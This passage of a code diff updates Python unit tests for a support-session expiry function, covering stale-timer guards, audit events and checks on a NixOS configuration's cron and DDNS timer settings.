+                disable_fn=lambda: [disabled.__setitem__(0, True), True][1],
+            )
+        self.assertFalse(result)
+        self.assertFalse(disabled[0])
 
     def test_past_expiry_expired(self):
         import time
-        info = {"expires_at": time.time() - 1}
-        self.assertTrue(self._is_expired(info))
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sf = self._write_session(tmpdir, expires_at=time.time() - 1)
+            disabled = [False]
+            result = support_ops.expire_if_stale(
+                sf,
+                clock_fn=time.time,
+                disable_fn=lambda: [disabled.__setitem__(0, True), True][1],
+            )
+        self.assertTrue(result)
+        self.assertTrue(disabled[0])
 
     def test_no_expiry_recent_session_not_expired(self):
         import time
-        info = {"enabled_at": time.time() - 100}
-        self.assertFalse(self._is_expired(info))
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sf = self._write_session(tmpdir, enabled_at=time.time() - 100)
+            result = support_ops.expire_if_stale(sf, clock_fn=time.time)
+        self.assertFalse(result)
 
     def test_no_expiry_old_session_expired(self):
         import time
-        info = {"enabled_at": time.time() - 86401}
-        self.assertTrue(self._is_expired(info))
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sf = self._write_session(tmpdir, enabled_at=time.time() - 86401)
+            disabled = [False]
+            result = support_ops.expire_if_stale(
+                sf,
+                clock_fn=time.time,
+                disable_fn=lambda: [disabled.__setitem__(0, True), True][1],
+            )
+        self.assertTrue(result)
+        self.assertTrue(disabled[0])
+
+    def test_session_id_guard_matching_expires(self):
+        """Timer with matching session_id must expire the session."""
+        import time
+        sid = "test-session-id"
+        exp = time.time() - 1
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sf = self._write_session(tmpdir, session_id=sid, expires_at=exp)
+            disabled = [False]
+            result = support_ops.expire_if_stale(
+                sf,
+                clock_fn=time.time,
+                disable_fn=lambda: [disabled.__setitem__(0, True), True][1],
+                session_id=sid,
+                expected_expiry=exp,
+            )
+        self.assertTrue(result)
+        self.assertTrue(disabled[0])
+
+    def test_stale_timer_does_not_revoke_replacement_session(self):
+        """A timer for an old session must not revoke a newer replacement session."""
+        import time
+        old_sid = "old-session"
+        new_sid = "new-session"
+        exp = time.time() - 1
+        with tempfile.TemporaryDirectory() as tmpdir:
+            # Current session has the NEW session id
+            sf = self._write_session(tmpdir, session_id=new_sid, expires_at=exp)
+            disabled = [False]
+            # Timer fires with OLD session id
+            result = support_ops.expire_if_stale(
+                sf,
+                clock_fn=time.time,
+                disable_fn=lambda: [disabled.__setitem__(0, True), True][1],
+                session_id=old_sid,  # stale — doesn't match stored new_sid
+                expected_expiry=exp,
+            )
+        self.assertFalse(result, "stale timer must not revoke replacement session")
+        self.assertFalse(disabled[0])
+
+    def test_stale_expiry_mismatch_does_not_revoke(self):
+        """A timer with mismatched expected_expiry must not revoke."""
+        import time
+        sid = "same-sid"
+        exp = time.time() - 1
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sf = self._write_session(tmpdir, session_id=sid, expires_at=exp + 999)
+            disabled = [False]
+            result = support_ops.expire_if_stale(
+                sf,
+                clock_fn=time.time,
+                disable_fn=lambda: [disabled.__setitem__(0, True), True][1],
+                session_id=sid,
+                expected_expiry=exp,  # differs from stored exp+999
+            )
+        self.assertFalse(result)
+        self.assertFalse(disabled[0])
+
+    def test_startup_reconciliation_with_live_session(self):
+        """On startup, a live session must not be expired."""
+        import time
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sf = self._write_session(tmpdir, expires_at=time.time() + 3600, session_id="live")
+            disabled = [False]
+            result = support_ops.expire_if_stale(
+                sf,
+                clock_fn=time.time,
+                disable_fn=lambda: [disabled.__setitem__(0, True), True][1],
+            )
+        self.assertFalse(result)
+        self.assertFalse(disabled[0])
+
+    def test_audit_callback_receives_support_expired_event(self):
+        import time
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sf = self._write_session(tmpdir, expires_at=time.time() - 1)
+            events = []
+            support_ops.expire_if_stale(
+                sf,
+                clock_fn=time.time,
+                audit_fn=lambda event, details="": events.append(event),
+            )
+        self.assertIn("SUPPORT_EXPIRED", events)
 
     def test_zero_enabled_at_not_expired(self):
-        info = {"enabled_at": 0}
-        self.assertFalse(self._is_expired(info))
+        with tempfile.TemporaryDirectory() as tmpdir:
+            sf = self._write_session(tmpdir, enabled_at=0)
+            result = support_ops.expire_if_stale(sf)
+        self.assertFalse(result)
+
+
+# ---------------------------------------------------------------------------
+# Cron composition
+# ---------------------------------------------------------------------------
+
+class TestCronComposition(unittest.TestCase):
+    """configuration.nix must not disable cron (rsnapshot and other module jobs depend on it)."""
+
+    def _get_config_content(self):
+        path = os.path.join(_REPO_ROOT, "configuration.nix")
+        with open(path) as f:
+            return f.read()
+
+    def test_cron_not_disabled(self):
+        """services.cron.enable = false must not appear in configuration.nix."""
+        self.assertNotIn("services.cron.enable = false", self._get_config_content())
+
+    def test_sovran_ddns_update_timer_in_njalla(self):
+        """The periodic Njalla updater must be the systemd timer, not a cron job."""
+        path = os.path.join(_REPO_ROOT, "modules", "core", "njalla.nix")
+        with open(path) as f:
+            content = f.read()
+        self.assertIn("sovran-ddns-update", content)
+        self.assertNotIn("services.cron", content)
 
 
 if __name__ == "__main__":
